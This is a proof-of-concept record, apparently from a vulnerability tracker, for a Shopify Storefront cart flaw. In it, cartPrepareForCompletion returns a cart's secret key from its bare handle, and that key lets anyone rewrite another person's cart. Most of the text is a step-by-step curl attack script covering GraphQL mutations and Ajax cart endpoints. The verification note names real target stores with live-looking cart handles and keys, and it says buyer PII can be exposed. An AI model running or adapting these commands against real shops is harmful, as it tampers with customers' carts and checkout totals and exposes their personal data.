# Shopify cartPrepareForCompletion 泄露 key 跨会话篡改他人购物车内容（行项目/note/attributes/折扣码）并在受害者 cart/checkout 呈现

- **code**: shopify-cart-leaked-key-content-tamper-tgc
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify Storefront Cart GraphQL（cartPrepareForCompletion / cartLinesUpdate / cartLinesAdd / cartNoteUpdate / cartAttributesUpdate）+ Ajax Cart API（/cart/change.js、/cart/update.js）
- **severity**: high
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-12 ARTEX 执行机实测两店（www handle hWNJ3mYwudoY5jToRoozEcQ4 key 7f32e99e6310ab10b9e8731eaffe2116；collect handle hWNJ3mZuks72goMoz1kxGDdo key 1231ede3ae709a05d22e20fdd031b0d0）：全新无 Cookie 裸 handle cartPrepareForCompletion 回显真实 key；仅用该 key 无 Cookie cartLinesUpdate 1→3 / cartLinesAdd 追加商品 / note / attributes / 折扣码全部 userErrors=[] 且持久；受害者 /cart.js 与 /cart、/checkout SSR 呈现篡改数量/新增商品/note/attributes/总额（www £12.95→£64.75，collect £94.95→£184.85）；Ajax /cart/update.js、/cart/change.js 用 Cookie: cart=handle?key=32hex 同效；错 key→"The specified cart does not exist."、随机 handle→result:null。原始报文 /opt/artex/data/tasks/7/i3902/。已并入 finding#84（version 11）。
- **tags**: shopify,cart,storefront,graphql,idor,unauthorized,cartlines,checkout,ajax-cart
- **created_at**: 2026-11-12T11:39:33.304Z
- **engine**: https://www.thegamecollection.net; https://collect.thegamecollection.net

## 描述

Shopify Storefront 的 cartPrepareForCompletion 不校验 cart GID 中的 ?key，裸 25 位 handle 即回显真实 32hex key（还可回显买家 PII/地址）；该 key 是完整写凭据：无 Cookie 可 cartLinesUpdate/cartLinesAdd/cartNoteUpdate/cartAttributesUpdate/cartDiscountCodesUpdate/cartMetafieldsSet 改写他人购物车内容，受害者本人 /cart.js、/cart、/checkout 会呈现被篡改的数量/商品/备注/属性与应付总额。Ajax 侧 /cart/change.js、/cart/update.js 接受同一 handle?key cookie 形式。前提是已知 handle（Tagfly 像素外泄 /apps.tagfly.io 或分享链接）。

## 用法

```
# 0) 受害者自建车（独立 cookie jar）
curl -sk -c victim.txt -X POST 'https://<shop>/cart/add.js' -H 'Content-Type: application/json' --data '{"items":[{"id":"<variant>","quantity":1}]}'
curl -sk -b victim.txt 'https://<shop>/cart.js' | jq '.token'   # token=<25位handle>?key=<32hex>

# 1) 验证者全新无 Cookie：裸 handle 泄露真实 key
curl -sk -X POST 'https://<shop>/api/graphql' -H 'Content-Type: application/json' --data '{"query":"mutation P($c:ID!){cartPrepareForCompletion(cartId:$c){result{__typename ... on CartStatusNotReady{cart{id} errors{code}} ... on CartStatusReady{cart{id}}}}}","variables":{"c":"gid://shopify/Cart/<handle>"}}'
# → cart.id = gid://shopify/Cart/<handle>?key=<REAL_KEY>

# 2) 仅用泄露 key、无 Cookie 写内容
curl -sk -X POST 'https://<shop>/api/graphql' -H 'Content-Type: application/json' --data '{"query":"mutation U($c:ID!,$l:[CartLineUpdateInput!]!){cartLinesUpdate(cartId:$c,lines:$l){cart{totalQuantity cost{totalAmount{amount}}} userErrors{field message}}}","variables":{"c":"gid://shopify/Cart/<handle>?key=<REAL_KEY>","l":[{"id":"gid://shopify/CartLine/<line_uuid>?cart=<handle>","quantity":3}]}}'
# cartLinesAdd: lines:[{merchandiseId:"gid://shopify/ProductVariant/<id>",quantity:2}]
# cartNoteUpdate / cartAttributesUpdate / cartDiscountCodesUpdate / cartMetafieldsSet 同法（ownerId/cartId 带 key）

# 3) 受害者侧验证：/cart.js、/cart、/checkout（302 shop.app 的 ur_back_url）
# 4) Ajax：fresh 无 jar，仅 Header
curl -sk -X POST 'https://<shop>/cart/update.js' -H 'Content-Type: application/json' -H 'Cookie: cart=<handle>?key=<REAL_KEY>' --data '{"updates":{"<variant>":2}}'
curl -sk -X POST 'https://<shop>/cart/change.js' -H 'Content-Type: application/json' -H 'Cookie: cart=<handle>?key=<REAL_KEY>' --data '{"id":"<variant>:<32hex line key from /cart.js>","quantity":3}}'
# 注意 /cart/change.js 的 id 必须是 variantId:32hex（不是 GraphQL CartLine GID）

# 对照：错 key → userErrors "The specified cart does not exist." 并回显新建空车；随机 handle → result:null
```
